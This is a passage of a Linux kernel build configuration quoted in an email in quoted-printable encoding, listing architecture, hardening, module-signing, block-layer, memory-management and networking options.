> CONFIG_GENERIC_SMP_IDLE_THREAD=3Dy
> CONFIG_ARCH_HAS_FORTIFY_SOURCE=3Dy
> CONFIG_ARCH_HAS_SET_MEMORY=3Dy
> CONFIG_ARCH_HAS_SET_DIRECT_MAP=3Dy
> CONFIG_ARCH_HAS_CPU_FINALIZE_INIT=3Dy
> CONFIG_ARCH_HAS_CPU_PASID=3Dy
> CONFIG_HAVE_ARCH_THREAD_STRUCT_WHITELIST=3Dy
> CONFIG_ARCH_WANTS_DYNAMIC_TASK_STRUCT=3Dy
> CONFIG_ARCH_WANTS_NO_INSTR=3Dy
> CONFIG_HAVE_ASM_MODVERSIONS=3Dy
> CONFIG_HAVE_REGS_AND_STACK_ACCESS_API=3Dy
> CONFIG_HAVE_RSEQ=3Dy
> CONFIG_HAVE_RUST=3Dy
> CONFIG_HAVE_FUNCTION_ARG_ACCESS_API=3Dy
> CONFIG_HAVE_HW_BREAKPOINT=3Dy
> CONFIG_HAVE_MIXED_BREAKPOINTS_REGS=3Dy
> CONFIG_HAVE_USER_RETURN_NOTIFIER=3Dy
> CONFIG_HAVE_PERF_EVENTS_NMI=3Dy
> CONFIG_HAVE_HARDLOCKUP_DETECTOR_PERF=3Dy
> CONFIG_UNWIND_USER=3Dy
> CONFIG_HAVE_UNWIND_USER_FP=3Dy
> CONFIG_HAVE_PERF_REGS=3Dy
> CONFIG_HAVE_PERF_USER_STACK_DUMP=3Dy
> CONFIG_HAVE_ARCH_JUMP_LABEL=3Dy
> CONFIG_HAVE_ARCH_JUMP_LABEL_RELATIVE=3Dy
> CONFIG_MMU_GATHER_TABLE_FREE=3Dy
> CONFIG_MMU_GATHER_RCU_TABLE_FREE=3Dy
> CONFIG_MMU_GATHER_MERGE_VMAS=3Dy
> CONFIG_ARCH_WANT_IRQS_OFF_ACTIVATE_MM=3Dy
> CONFIG_MMU_LAZY_TLB_REFCOUNT=3Dy
> CONFIG_ARCH_HAVE_NMI_SAFE_CMPXCHG=3Dy
> CONFIG_ARCH_HAVE_EXTRA_ELF_NOTES=3Dy
> CONFIG_ARCH_HAS_NMI_SAFE_THIS_CPU_OPS=3Dy
> CONFIG_HAVE_ALIGNED_STRUCT_PAGE=3Dy
> CONFIG_HAVE_CMPXCHG_LOCAL=3Dy
> CONFIG_HAVE_CMPXCHG_DOUBLE=3Dy
> CONFIG_ARCH_WANT_COMPAT_IPC_PARSE_VERSION=3Dy
> CONFIG_ARCH_WANT_OLD_COMPAT_IPC=3Dy
> CONFIG_HAVE_ARCH_SECCOMP=3Dy
> CONFIG_HAVE_ARCH_SECCOMP_FILTER=3Dy
> CONFIG_SECCOMP=3Dy
> CONFIG_SECCOMP_FILTER=3Dy
> # CONFIG_SECCOMP_CACHE_DEBUG is not set
> CONFIG_HAVE_ARCH_KSTACK_ERASE=3Dy
> CONFIG_HAVE_STACKPROTECTOR=3Dy
> CONFIG_STACKPROTECTOR=3Dy
> CONFIG_STACKPROTECTOR_STRONG=3Dy
> CONFIG_ARCH_SUPPORTS_LTO_CLANG=3Dy
> CONFIG_ARCH_SUPPORTS_LTO_CLANG_THIN=3Dy
> CONFIG_LTO_NONE=3Dy
> CONFIG_ARCH_SUPPORTS_AUTOFDO_CLANG=3Dy
> CONFIG_ARCH_SUPPORTS_PROPELLER_CLANG=3Dy
> CONFIG_ARCH_SUPPORTS_CFI=3Dy
> CONFIG_HAVE_ARCH_WITHIN_STACK_FRAMES=3Dy
> CONFIG_HAVE_CONTEXT_TRACKING_USER=3Dy
> CONFIG_HAVE_CONTEXT_TRACKING_USER_OFFSTACK=3Dy
> CONFIG_HAVE_VIRT_CPU_ACCOUNTING_GEN=3Dy
> CONFIG_HAVE_IRQ_TIME_ACCOUNTING=3Dy
> CONFIG_HAVE_PV_STEAL_CLOCK_GEN=3Dy
> CONFIG_HAVE_MOVE_PUD=3Dy
> CONFIG_HAVE_MOVE_PMD=3Dy
> CONFIG_HAVE_ARCH_TRANSPARENT_HUGEPAGE=3Dy
> CONFIG_HAVE_ARCH_TRANSPARENT_HUGEPAGE_PUD=3Dy
> CONFIG_HAVE_ARCH_HUGE_VMAP=3Dy
> CONFIG_HAVE_ARCH_HUGE_VMALLOC=3Dy
> CONFIG_ARCH_WANT_HUGE_PMD_SHARE=3Dy
> CONFIG_ARCH_WANT_PMD_MKWRITE=3Dy
> CONFIG_HAVE_ARCH_SOFT_DIRTY=3Dy
> CONFIG_HAVE_MOD_ARCH_SPECIFIC=3Dy
> CONFIG_MODULES_USE_ELF_RELA=3Dy
> CONFIG_ARCH_HAS_EXECMEM_ROX=3Dy
> CONFIG_HAVE_IRQ_EXIT_ON_IRQ_STACK=3Dy
> CONFIG_HAVE_SOFTIRQ_ON_OWN_STACK=3Dy
> CONFIG_SOFTIRQ_ON_OWN_STACK=3Dy
> CONFIG_ARCH_HAS_ELF_RANDOMIZE=3Dy
> CONFIG_HAVE_ARCH_MMAP_RND_BITS=3Dy
> CONFIG_HAVE_EXIT_THREAD=3Dy
> CONFIG_ARCH_MMAP_RND_BITS=3D28
> CONFIG_HAVE_ARCH_MMAP_RND_COMPAT_BITS=3Dy
> CONFIG_ARCH_MMAP_RND_COMPAT_BITS=3D8
> CONFIG_HAVE_ARCH_COMPAT_MMAP_BASES=3Dy
> CONFIG_HAVE_PAGE_SIZE_4KB=3Dy
> CONFIG_PAGE_SIZE_4KB=3Dy
> CONFIG_PAGE_SIZE_LESS_THAN_64KB=3Dy
> CONFIG_PAGE_SIZE_LESS_THAN_256KB=3Dy
> CONFIG_PAGE_SHIFT=3D12
> CONFIG_HAVE_OBJTOOL=3Dy
> CONFIG_HAVE_JUMP_LABEL_HACK=3Dy
> CONFIG_HAVE_NOINSTR_HACK=3Dy
> CONFIG_HAVE_NOINSTR_VALIDATION=3Dy
> CONFIG_HAVE_UACCESS_VALIDATION=3Dy
> CONFIG_HAVE_STACK_VALIDATION=3Dy
> CONFIG_HAVE_RELIABLE_STACKTRACE=3Dy
> CONFIG_OLD_SIGSUSPEND3=3Dy
> CONFIG_COMPAT_OLD_SIGACTION=3Dy
> CONFIG_COMPAT_32BIT_TIME=3Dy
> CONFIG_ARCH_SUPPORTS_RT=3Dy
> CONFIG_HAVE_ARCH_VMAP_STACK=3Dy
> CONFIG_VMAP_STACK=3Dy
> CONFIG_HAVE_ARCH_RANDOMIZE_KSTACK_OFFSET=3Dy
> CONFIG_RANDOMIZE_KSTACK_OFFSET=3Dy
> # CONFIG_RANDOMIZE_KSTACK_OFFSET_DEFAULT is not set
> CONFIG_ARCH_HAS_STRICT_KERNEL_RWX=3Dy
> CONFIG_STRICT_KERNEL_RWX=3Dy
> CONFIG_ARCH_HAS_STRICT_MODULE_RWX=3Dy
> CONFIG_STRICT_MODULE_RWX=3Dy
> CONFIG_HAVE_ARCH_PREL32_RELOCATIONS=3Dy
> # CONFIG_LOCK_EVENT_COUNTS is not set
> CONFIG_ARCH_HAS_MEM_ENCRYPT=3Dy
> CONFIG_HAVE_STATIC_CALL=3Dy
> CONFIG_HAVE_STATIC_CALL_INLINE=3Dy
> CONFIG_HAVE_PREEMPT_DYNAMIC=3Dy
> CONFIG_HAVE_PREEMPT_DYNAMIC_CALL=3Dy
> CONFIG_ARCH_WANT_LD_ORPHAN_WARN=3Dy
> CONFIG_ARCH_SUPPORTS_DEBUG_PAGEALLOC=3Dy
> CONFIG_ARCH_SUPPORTS_PAGE_TABLE_CHECK=3Dy
> CONFIG_ARCH_HAS_ELFCORE_COMPAT=3Dy
> CONFIG_ARCH_HAS_PARANOID_L1D_FLUSH=3Dy
> CONFIG_DYNAMIC_SIGFRAME=3Dy
> CONFIG_HAVE_ARCH_NODE_DEV_GROUP=3Dy
> CONFIG_ARCH_HAS_HW_PTE_YOUNG=3Dy
> CONFIG_ARCH_HAS_NONLEAF_PMD_YOUNG=3Dy
> CONFIG_ARCH_HAS_KERNEL_FPU_SUPPORT=3Dy
> CONFIG_HAVE_GENERIC_TIF_BITS=3Dy
>=20
> #
> # GCOV-based kernel profiling
> #
> # CONFIG_GCOV_KERNEL is not set
> CONFIG_ARCH_HAS_GCOV_PROFILE_ALL=3Dy
> # end of GCOV-based kernel profiling
>=20
> CONFIG_HAVE_GCC_PLUGINS=3Dy
> CONFIG_FUNCTION_ALIGNMENT_4B=3Dy
> CONFIG_FUNCTION_ALIGNMENT_16B=3Dy
> CONFIG_FUNCTION_ALIGNMENT=3D16
> CONFIG_ARCH_HAS_CPU_ATTACK_VECTORS=3Dy
> # end of General architecture-dependent options
>=20
> CONFIG_RT_MUTEXES=3Dy
> CONFIG_MODULE_SIG_FORMAT=3Dy
> CONFIG_MODULES=3Dy
> # CONFIG_MODULE_DEBUG is not set
> # CONFIG_MODULE_FORCE_LOAD is not set
> CONFIG_MODULE_UNLOAD=3Dy
> CONFIG_MODULE_FORCE_UNLOAD=3Dy
> # CONFIG_MODULE_UNLOAD_TAINT_TRACKING is not set
> CONFIG_MODVERSIONS=3Dy
> # CONFIG_GENKSYMS is not set
> CONFIG_GENDWARFKSYMS=3Dy
> CONFIG_ASM_MODVERSIONS=3Dy
> # CONFIG_EXTENDED_MODVERSIONS is not set
> # CONFIG_BASIC_MODVERSIONS is not set
> CONFIG_MODULE_SRCVERSION_ALL=3Dy
> CONFIG_MODULE_SIG=3Dy
> # CONFIG_MODULE_SIG_FORCE is not set
> # CONFIG_MODULE_SIG_ALL is not set
> CONFIG_MODULE_SIG_SHA256=3Dy
> # CONFIG_MODULE_SIG_SHA384 is not set
> # CONFIG_MODULE_SIG_SHA512 is not set
> # CONFIG_MODULE_SIG_SHA3_256 is not set
> # CONFIG_MODULE_SIG_SHA3_384 is not set
> # CONFIG_MODULE_SIG_SHA3_512 is not set
> CONFIG_MODULE_SIG_HASH=3D"sha256"
> # CONFIG_MODULE_COMPRESS is not set
> # CONFIG_MODULE_ALLOW_MISSING_NAMESPACE_IMPORTS is not set
> CONFIG_MODPROBE_PATH=3D"/sbin/modprobe"
> # CONFIG_TRIM_UNUSED_KSYMS is not set
> CONFIG_MODULES_TREE_LOOKUP=3Dy
> CONFIG_BLOCK=3Dy
> CONFIG_BLOCK_LEGACY_AUTOLOAD=3Dy
> CONFIG_BLK_RQ_ALLOC_TIME=3Dy
> CONFIG_BLK_CGROUP_RWSTAT=3Dy
> CONFIG_BLK_CGROUP_PUNT_BIO=3Dy
> CONFIG_BLK_DEV_BSG_COMMON=3Dy
> CONFIG_BLK_ICQ=3Dy
> CONFIG_BLK_DEV_BSGLIB=3Dy
> CONFIG_BLK_DEV_INTEGRITY=3Dy
> # CONFIG_BLK_DEV_WRITE_MOUNTED is not set
> CONFIG_BLK_DEV_ZONED=3Dy
> CONFIG_BLK_DEV_THROTTLING=3Dy
> CONFIG_BLK_WBT=3Dy
> CONFIG_BLK_WBT_MQ=3Dy
> CONFIG_BLK_CGROUP_IOLATENCY=3Dy
> # CONFIG_BLK_CGROUP_FC_APPID is not set
> CONFIG_BLK_CGROUP_IOCOST=3Dy
> CONFIG_BLK_CGROUP_IOPRIO=3Dy
> CONFIG_BLK_DEBUG_FS=3Dy
> # CONFIG_BLK_SED_OPAL is not set
> CONFIG_BLK_INLINE_ENCRYPTION=3Dy
> CONFIG_BLK_INLINE_ENCRYPTION_FALLBACK=3Dy
>=20
> #
> # Partition Types
> #
> CONFIG_PARTITION_ADVANCED=3Dy
> CONFIG_ACORN_PARTITION=3Dy
> CONFIG_ACORN_PARTITION_CUMANA=3Dy
> CONFIG_ACORN_PARTITION_EESOX=3Dy
> CONFIG_ACORN_PARTITION_ICS=3Dy
> CONFIG_ACORN_PARTITION_ADFS=3Dy
> CONFIG_ACORN_PARTITION_POWERTEC=3Dy
> CONFIG_ACORN_PARTITION_RISCIX=3Dy
> CONFIG_AIX_PARTITION=3Dy
> CONFIG_OSF_PARTITION=3Dy
> CONFIG_AMIGA_PARTITION=3Dy
> CONFIG_ATARI_PARTITION=3Dy
> CONFIG_MAC_PARTITION=3Dy
> CONFIG_MSDOS_PARTITION=3Dy
> CONFIG_BSD_DISKLABEL=3Dy
> CONFIG_MINIX_SUBPARTITION=3Dy
> CONFIG_SOLARIS_X86_PARTITION=3Dy
> CONFIG_UNIXWARE_DISKLABEL=3Dy
> CONFIG_LDM_PARTITION=3Dy
> # CONFIG_LDM_DEBUG is not set
> CONFIG_SGI_PARTITION=3Dy
> CONFIG_ULTRIX_PARTITION=3Dy
> CONFIG_SUN_PARTITION=3Dy
> CONFIG_KARMA_PARTITION=3Dy
> CONFIG_EFI_PARTITION=3Dy
> CONFIG_SYSV68_PARTITION=3Dy
> CONFIG_CMDLINE_PARTITION=3Dy
> # CONFIG_OF_PARTITION is not set
> # end of Partition Types
>=20
> CONFIG_BLK_PM=3Dy
> CONFIG_BLOCK_HOLDER_DEPRECATED=3Dy
> CONFIG_BLK_MQ_STACKING=3Dy
>=20
> #
> # IO Schedulers
> #
> CONFIG_MQ_IOSCHED_DEADLINE=3Dy
> CONFIG_MQ_IOSCHED_KYBER=3Dy
> CONFIG_IOSCHED_BFQ=3Dy
> CONFIG_BFQ_GROUP_IOSCHED=3Dy
> CONFIG_BFQ_CGROUP_DEBUG=3Dy
> # end of IO Schedulers
>=20
> CONFIG_PREEMPT_NOTIFIERS=3Dy
> CONFIG_PADATA=3Dy
> CONFIG_ASN1=3Dy
> CONFIG_UNINLINE_SPIN_UNLOCK=3Dy
> CONFIG_ARCH_SUPPORTS_ATOMIC_RMW=3Dy
> CONFIG_MUTEX_SPIN_ON_OWNER=3Dy
> CONFIG_RWSEM_SPIN_ON_OWNER=3Dy
> CONFIG_LOCK_SPIN_ON_OWNER=3Dy
> CONFIG_ARCH_USE_QUEUED_SPINLOCKS=3Dy
> CONFIG_QUEUED_SPINLOCKS=3Dy
> CONFIG_ARCH_USE_QUEUED_RWLOCKS=3Dy
> CONFIG_QUEUED_RWLOCKS=3Dy
> CONFIG_ARCH_HAS_NON_OVERLAPPING_ADDRESS_SPACE=3Dy
> CONFIG_ARCH_HAS_SYNC_CORE_BEFORE_USERMODE=3Dy
> CONFIG_ARCH_HAS_SYSCALL_WRAPPER=3Dy
> CONFIG_FREEZER=3Dy
>=20
> #
> # Executable file formats
> #
> CONFIG_BINFMT_ELF=3Dy
> CONFIG_COMPAT_BINFMT_ELF=3Dy
> CONFIG_ELFCORE=3Dy
> CONFIG_CORE_DUMP_DEFAULT_ELF_HEADERS=3Dy
> CONFIG_BINFMT_SCRIPT=3Dy
> CONFIG_BINFMT_MISC=3Dy
> CONFIG_COREDUMP=3Dy
> # end of Executable file formats
>=20
> #
> # Memory Management options
> #
> CONFIG_SWAP=3Dy
> CONFIG_ZSWAP=3Dy
> CONFIG_ZSWAP_DEFAULT_ON=3Dy
> CONFIG_ZSWAP_SHRINKER_DEFAULT_ON=3Dy
> # CONFIG_ZSWAP_COMPRESSOR_DEFAULT_DEFLATE is not set
> # CONFIG_ZSWAP_COMPRESSOR_DEFAULT_LZO is not set
> CONFIG_ZSWAP_COMPRESSOR_DEFAULT_842=3Dy
> # CONFIG_ZSWAP_COMPRESSOR_DEFAULT_LZ4 is not set
> # CONFIG_ZSWAP_COMPRESSOR_DEFAULT_LZ4HC is not set
> # CONFIG_ZSWAP_COMPRESSOR_DEFAULT_ZSTD is not set
> CONFIG_ZSWAP_COMPRESSOR_DEFAULT=3D"842"
> CONFIG_ZSMALLOC=3Dy
>=20
> #
> # Zsmalloc allocator options
> #
>=20
> #
> # Zsmalloc is a common backend allocator for zswap & zram
> #
> # CONFIG_ZSMALLOC_STAT is not set
> CONFIG_ZSMALLOC_CHAIN_SIZE=3D8
> # end of Zsmalloc allocator options
>=20
> #
> # Slab allocator options
> #
> CONFIG_SLUB=3Dy
> CONFIG_KVFREE_RCU_BATCHED=3Dy
> # CONFIG_SLUB_TINY is not set
> CONFIG_SLAB_MERGE_DEFAULT=3Dy
> # CONFIG_SLAB_FREELIST_RANDOM is not set
> # CONFIG_SLAB_FREELIST_HARDENED is not set
> # CONFIG_SLAB_BUCKETS is not set
> # CONFIG_SLUB_STATS is not set
> # CONFIG_RANDOM_KMALLOC_CACHES is not set
> # end of Slab allocator options
>=20
> # CONFIG_SHUFFLE_PAGE_ALLOCATOR is not set
> # CONFIG_COMPAT_BRK is not set
> CONFIG_SPARSEMEM=3Dy
> CONFIG_SPARSEMEM_EXTREME=3Dy
> CONFIG_SPARSEMEM_VMEMMAP_ENABLE=3Dy
> CONFIG_SPARSEMEM_VMEMMAP=3Dy
> CONFIG_SPARSEMEM_VMEMMAP_PREINIT=3Dy
> CONFIG_ARCH_WANT_OPTIMIZE_DAX_VMEMMAP=3Dy
> CONFIG_ARCH_WANT_OPTIMIZE_HUGETLB_VMEMMAP=3Dy
> CONFIG_ARCH_WANT_HUGETLB_VMEMMAP_PREINIT=3Dy
> CONFIG_HAVE_GUP_FAST=3Dy
> CONFIG_NUMA_KEEP_MEMINFO=3Dy
> CONFIG_MEMORY_ISOLATION=3Dy
> CONFIG_EXCLUSIVE_SYSTEM_RAM=3Dy
> CONFIG_HAVE_BOOTMEM_INFO_NODE=3Dy
> CONFIG_ARCH_ENABLE_MEMORY_HOTPLUG=3Dy
> CONFIG_ARCH_ENABLE_MEMORY_HOTREMOVE=3Dy
> CONFIG_MEMORY_HOTPLUG=3Dy
> # CONFIG_MHP_DEFAULT_ONLINE_TYPE_OFFLINE is not set
> CONFIG_MHP_DEFAULT_ONLINE_TYPE_ONLINE_AUTO=3Dy
> # CONFIG_MHP_DEFAULT_ONLINE_TYPE_ONLINE_KERNEL is not set
> # CONFIG_MHP_DEFAULT_ONLINE_TYPE_ONLINE_MOVABLE is not set
> CONFIG_MEMORY_HOTREMOVE=3Dy
> CONFIG_MHP_MEMMAP_ON_MEMORY=3Dy
> CONFIG_ARCH_MHP_MEMMAP_ON_MEMORY_ENABLE=3Dy
> CONFIG_SPLIT_PTE_PTLOCKS=3Dy
> CONFIG_ARCH_ENABLE_SPLIT_PMD_PTLOCK=3Dy
> CONFIG_SPLIT_PMD_PTLOCKS=3Dy
> CONFIG_BALLOON=3Dy
> CONFIG_BALLOON_MIGRATION=3Dy
> CONFIG_COMPACTION=3Dy
> CONFIG_COMPACT_UNEVICTABLE_DEFAULT=3D1
> CONFIG_PAGE_REPORTING=3Dy
> CONFIG_MIGRATION=3Dy
> CONFIG_DEVICE_MIGRATION=3Dy
> CONFIG_ARCH_ENABLE_HUGEPAGE_MIGRATION=3Dy
> CONFIG_ARCH_ENABLE_THP_MIGRATION=3Dy
> CONFIG_CONTIG_ALLOC=3Dy
> CONFIG_PCP_BATCH_SCALE_MAX=3D5
> CONFIG_PHYS_ADDR_T_64BIT=3Dy
> CONFIG_MMU_NOTIFIER=3Dy
> CONFIG_KSM=3Dy
> CONFIG_DEFAULT_MMAP_MIN_ADDR=3D4096
> CONFIG_ARCH_SUPPORTS_MEMORY_FAILURE=3Dy
> # CONFIG_MEMORY_FAILURE is not set
> CONFIG_ARCH_WANT_GENERAL_HUGETLB=3Dy
> CONFIG_ARCH_WANTS_THP_SWAP=3Dy
> # CONFIG_PERSISTENT_HUGE_ZERO_FOLIO is not set
> CONFIG_MM_ID=3Dy
> CONFIG_TRANSPARENT_HUGEPAGE=3Dy
> # CONFIG_TRANSPARENT_HUGEPAGE_ALWAYS is not set
> CONFIG_TRANSPARENT_HUGEPAGE_MADVISE=3Dy
> # CONFIG_TRANSPARENT_HUGEPAGE_NEVER is not set
> CONFIG_TRANSPARENT_HUGEPAGE_SHMEM_HUGE_NEVER=3Dy
> # CONFIG_TRANSPARENT_HUGEPAGE_SHMEM_HUGE_ALWAYS is not set
> # CONFIG_TRANSPARENT_HUGEPAGE_SHMEM_HUGE_WITHIN_SIZE is not set
> # CONFIG_TRANSPARENT_HUGEPAGE_SHMEM_HUGE_ADVISE is not set
> CONFIG_TRANSPARENT_HUGEPAGE_TMPFS_HUGE_NEVER=3Dy
> # CONFIG_TRANSPARENT_HUGEPAGE_TMPFS_HUGE_ALWAYS is not set
> # CONFIG_TRANSPARENT_HUGEPAGE_TMPFS_HUGE_WITHIN_SIZE is not set
> # CONFIG_TRANSPARENT_HUGEPAGE_TMPFS_HUGE_ADVISE is not set
> CONFIG_THP_SWAP=3Dy
> CONFIG_READ_ONLY_THP_FOR_FS=3Dy
> # CONFIG_NO_PAGE_MAPCOUNT is not set
> CONFIG_PAGE_MAPCOUNT=3Dy
> CONFIG_PGTABLE_HAS_HUGE_LEAVES=3Dy
> CONFIG_HAVE_GIGANTIC_FOLIOS=3Dy
> CONFIG_ASYNC_KERNEL_PGTABLE_FREE=3Dy
> CONFIG_ARCH_SUPPORTS_HUGE_PFNMAP=3Dy
> CONFIG_ARCH_SUPPORTS_PMD_PFNMAP=3Dy
> CONFIG_ARCH_SUPPORTS_PUD_PFNMAP=3Dy
> CONFIG_NEED_PER_CPU_EMBED_FIRST_CHUNK=3Dy
> CONFIG_NEED_PER_CPU_PAGE_FIRST_CHUNK=3Dy
> CONFIG_USE_PERCPU_NUMA_NODE_ID=3Dy
> CONFIG_HAVE_SETUP_PER_CPU_AREA=3Dy
> CONFIG_CMA=3Dy
> # CONFIG_CMA_DEBUGFS is not set
> # CONFIG_CMA_SYSFS is not set
> CONFIG_CMA_AREAS=3D20
> CONFIG_PAGE_BLOCK_MAX_ORDER=3D10
> CONFIG_MEM_SOFT_DIRTY=3Dy
> CONFIG_GENERIC_EARLY_IOREMAP=3Dy
> # CONFIG_DEFERRED_STRUCT_PAGE_INIT is not set
> CONFIG_PAGE_IDLE_FLAG=3Dy
> # CONFIG_IDLE_PAGE_TRACKING is not set
> CONFIG_ARCH_HAS_CACHE_LINE_SIZE=3Dy
> CONFIG_ARCH_HAS_CURRENT_STACK_POINTER=3Dy
> CONFIG_ARCH_HAS_ZONE_DMA_SET=3Dy
> CONFIG_ZONE_DMA=3Dy
> CONFIG_ZONE_DMA32=3Dy
> CONFIG_ZONE_DEVICE=3Dy
> CONFIG_HMM_MIRROR=3Dy
> CONFIG_GET_FREE_REGION=3Dy
> CONFIG_DEVICE_PRIVATE=3Dy
> CONFIG_VMAP_PFN=3Dy
> CONFIG_ARCH_USES_HIGH_VMA_FLAGS=3Dy
> CONFIG_ARCH_HAS_PKEYS=3Dy
> CONFIG_ARCH_USES_PG_ARCH_2=3Dy
> CONFIG_VM_EVENT_COUNTERS=3Dy
> CONFIG_PERCPU_STATS=3Dy
> # CONFIG_GUP_TEST is not set
> # CONFIG_DMAPOOL_TEST is not set
> CONFIG_ARCH_HAS_PTE_SPECIAL=3Dy
> CONFIG_MAPPING_DIRTY_HELPERS=3Dy
> CONFIG_KMAP_LOCAL=3Dy
> CONFIG_MEMFD_CREATE=3Dy
> CONFIG_SECRETMEM=3Dy
> CONFIG_ANON_VMA_NAME=3Dy
> CONFIG_HAVE_ARCH_USERFAULTFD_WP=3Dy
> CONFIG_HAVE_ARCH_USERFAULTFD_MINOR=3Dy
> CONFIG_USERFAULTFD=3Dy
> # CONFIG_PTE_MARKER_UFFD_WP is not set
> CONFIG_LRU_GEN=3Dy
> CONFIG_LRU_GEN_ENABLED=3Dy
> # CONFIG_LRU_GEN_STATS is not set
> CONFIG_LRU_GEN_WALKS_MMU=3Dy
> CONFIG_ARCH_SUPPORTS_PER_VMA_LOCK=3Dy
> CONFIG_PER_VMA_LOCK=3Dy
> CONFIG_LOCK_MM_AND_FIND_VMA=3Dy
> CONFIG_IOMMU_MM_DATA=3Dy
> CONFIG_EXECMEM=3Dy
> CONFIG_NUMA_MEMBLKS=3Dy
> CONFIG_NUMA_EMU=3Dy
> CONFIG_ARCH_HAS_USER_SHADOW_STACK=3Dy
> CONFIG_PT_RECLAIM=3Dy
>=20
> #
> # Data Access Monitoring
> #
> CONFIG_DAMON=3Dy
> CONFIG_DAMON_VADDR=3Dy
> CONFIG_DAMON_PADDR=3Dy
> # CONFIG_DAMON_SYSFS is not set
> CONFIG_DAMON_RECLAIM=3Dy
> # CONFIG_DAMON_LRU_SORT is not set
> # CONFIG_DAMON_STAT is not set
> # end of Data Access Monitoring
> # end of Memory Management options
>=20
> CONFIG_NET=3Dy
> CONFIG_WANT_COMPAT_NETLINK_MESSAGES=3Dy
> CONFIG_COMPAT_NETLINK_MESSAGES=3Dy
> CONFIG_NET_INGRESS=3Dy
> CONFIG_NET_EGRESS=3Dy
> CONFIG_NET_XGRESS=3Dy
> CONFIG_NET_REDIRECT=3Dy
> CONFIG_SKB_DECRYPTED=3Dy
> CONFIG_SKB_EXTENSIONS=3Dy
> CONFIG_NET_DEVMEM=3Dy
> CONFIG_NET_SHAPER=3Dy
> CONFIG_NET_CRC32C=3Dy
>=20
> #
> # Networking options
> #
> CONFIG_PACKET=3Dy
> CONFIG_PACKET_DIAG=3Dy
> # CONFIG_INET_PSP is not set
> CONFIG_UNIX=3Dy
> CONFIG_AF_UNIX_OOB=3Dy
> CONFIG_UNIX_DIAG=3Dy
> CONFIG_TLS=3Dy
> CONFIG_TLS_DEVICE=3Dy
> CONFIG_TLS_TOE=3Dy
> CONFIG_XFRM=3Dy
> CONFIG_XFRM_OFFLOAD=3Dy
> CONFIG_XFRM_ALGO=3Dy
> CONFIG_XFRM_USER=3Dy
> CONFIG_XFRM_USER_COMPAT=3Dy
> CONFIG_XFRM_INTERFACE=3Dy
> CONFIG_XFRM_SUB_POLICY=3Dy
> CONFIG_XFRM_MIGRATE=3Dy
> CONFIG_XFRM_STATISTICS=3Dy
> CONFIG_XFRM_AH=3Dy
> CONFIG_XFRM_ESP=3Dy
> CONFIG_XFRM_IPCOMP=3Dy
> CONFIG_NET_KEY=3Dy
> CONFIG_NET_KEY_MIGRATE=3Dy
> # CONFIG_XFRM_IPTFS is not set
> CONFIG_XFRM_ESPINTCP=3Dy
> # CONFIG_DIBS is not set
> CONFIG_XDP_SOCKETS=3Dy
> CONFIG_XDP_SOCKETS_DIAG=3Dy
> CONFIG_NET_HANDSHAKE=3Dy
> CONFIG_INET=3Dy
> CONFIG_IP_MULTICAST=3Dy
> CONFIG_IP_ADVANCED_ROUTER=3Dy
> CONFIG_IP_FIB_TRIE_STATS=3Dy
> CONFIG_IP_MULTIPLE_TABLES=3Dy
> CONFIG_IP_ROUTE_MULTIPATH=3Dy
> CONFIG_IP_ROUTE_VERBOSE=3Dy
> CONFIG_IP_ROUTE_CLASSID=3Dy
> CONFIG_IP_PNP=3Dy
> CONFIG_IP_PNP_DHCP=3Dy
> CONFIG_IP_PNP_BOOTP=3Dy
> CONFIG_IP_PNP_RARP=3Dy
> CONFIG_NET_IPIP=3Dy
> CONFIG_NET_IPGRE_DEMUX=3Dy
> CONFIG_NET_IP_TUNNEL=3Dy
> CONFIG_NET_IPGRE=3Dy
> CONFIG_NET_IPGRE_BROADCAST=3Dy
> CONFIG_IP_MROUTE_COMMON=3Dy
> CONFIG_IP_MROUTE=3Dy
> CONFIG_IP_MROUTE_MULTIPLE_TABLES=3Dy
> CONFIG_IP_PIMSM_V1=3Dy
> CONFIG_IP_PIMSM_V2=3Dy
> CONFIG_SYN_COOKIES=3Dy
> CONFIG_NET_IPVTI=3Dy
> CONFIG_NET_UDP_TUNNEL=3Dy
> CONFIG_NET_FOU=3Dy
> CONFIG_NET_FOU_IP_TUNNELS=3Dy
> CONFIG_INET_AH=3Dy
> CONFIG_INET_ESP=3Dy
> CONFIG_INET_ESP_OFFLOAD=3Dy
> CONFIG_INET_ESPINTCP=3Dy
> CONFIG_INET_IPCOMP=3Dy
> CONFIG_INET_TABLE_PERTURB_ORDER=3D16
> CONFIG_INET_XFRM_TUNNEL=3Dy
> CONFIG_INET_TUNNEL=3Dy
> CONFIG_INET_DIAG=3Dy
> CONFIG_INET_TCP_DIAG=3Dy
> CONFIG_INET_UDP_DIAG=3Dy
> CONFIG_INET_RAW_DIAG=3Dy
> CONFIG_INET_DIAG_DESTROY=3Dy
> CONFIG_TCP_CONG_ADVANCED=3Dy
> CONFIG_TCP_CONG_BIC=3Dy
> CONFIG_TCP_CONG_CUBIC=3Dy
> CONFIG_TCP_CONG_WESTWOOD=3Dy
> CONFIG_TCP_CONG_HTCP=3Dy
> CONFIG_TCP_CONG_HSTCP=3Dy
> CONFIG_TCP_CONG_HYBLA=3Dy
> CONFIG_TCP_CONG_VEGAS=3Dy
> CONFIG_TCP_CONG_NV=3Dy
> CONFIG_TCP_CONG_SCALABLE=3Dy
> CONFIG_TCP_CONG_LP=3Dy
> CONFIG_TCP_CONG_VENO=3Dy
> CONFIG_TCP_CONG_YEAH=3Dy
> CONFIG_TCP_CONG_ILLINOIS=3Dy
> CONFIG_TCP_CONG_DCTCP=3Dy
> CONFIG_TCP_CONG_CDG=3Dy
> CONFIG_TCP_CONG_BBR=3Dy
> # CONFIG_DEFAULT_BIC is not set
> CONFIG_DEFAULT_CUBIC=3Dy
> # CONFIG_DEFAULT_HTCP is not set
> # CONFIG_DEFAULT_HYBLA is not set
> # CONFIG_DEFAULT_VEGAS is not set
> # CONFIG_DEFAULT_VENO is not set
> # CONFIG_DEFAULT_WESTWOOD is not set
> # CONFIG_DEFAULT_DCTCP is not set
> # CONFIG_DEFAULT_CDG is not set
> # CONFIG_DEFAULT_BBR is not set
> # CONFIG_DEFAULT_RENO is not set
> CONFIG_DEFAULT_TCP_CONG=3D"cubic"
> # CONFIG_TCP_AO is not set
> CONFIG_TCP_MD5SIG=3Dy
> CONFIG_IPV6=3Dy
> CONFIG_IPV6_ROUTER_PREF=3Dy
> CONFIG_IPV6_ROUTE_INFO=3Dy
> CONFIG_IPV6_OPTIMISTIC_DAD=3Dy
> CONFIG_INET6_AH=3Dy
> CONFIG_INET6_ESP=3Dy
> CONFIG_INET6_ESP_OFFLOAD=3Dy
